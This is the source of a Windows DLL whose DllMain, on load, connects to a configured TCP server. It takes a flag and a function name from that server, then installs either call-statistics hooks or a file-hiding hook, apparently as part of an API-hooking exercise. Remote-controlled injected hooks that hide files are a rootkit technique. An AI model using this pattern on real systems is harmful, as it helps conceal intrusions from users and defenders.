#include "pch.h"
#include "Hook.h"

void init_connect() {
    WSADATA wsaData;
    struct sockaddr_in addr;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip_address);
    addr.sin_port = htons(port);
    int err = connect(connect_socket, (struct sockaddr*)&addr, sizeof(addr));
    if (err == SOCKET_ERROR) {
        closesocket(connect_socket);
        WSACleanup();
        exit(0);
    }
    char recvbuf[] = "ok";
    send(connect_socket, recvbuf, strlen(recvbuf) + 1, 0);
    return;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  num_call, LPVOID lpReserved)
{
    switch (num_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        OutputDebugStringA("[MY DLL] Attach and Initialization DLL\n");       
        init_connect();
       
        char recvbuf[MAXLEN];
        recv(connect_socket, recvbuf, MAXLEN, 0);
        int flag = recvbuf[0]-'0';
        strncpy(name, recvbuf + 1, MAXLEN);

        char debug_msg[MAXLEN];
        sprintf(debug_msg, "[MY DLL] Value flag: %d; Function name: %s\n", flag, name);
        OutputDebugStringA(debug_msg);

        if (flag == 1)
        {
            attach_statistic();
        }
        else  if (flag == 2) 
        {
            attach_hide_file();
            closesocket(connect_socket);
            WSACleanup();
            return 1;
        }
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}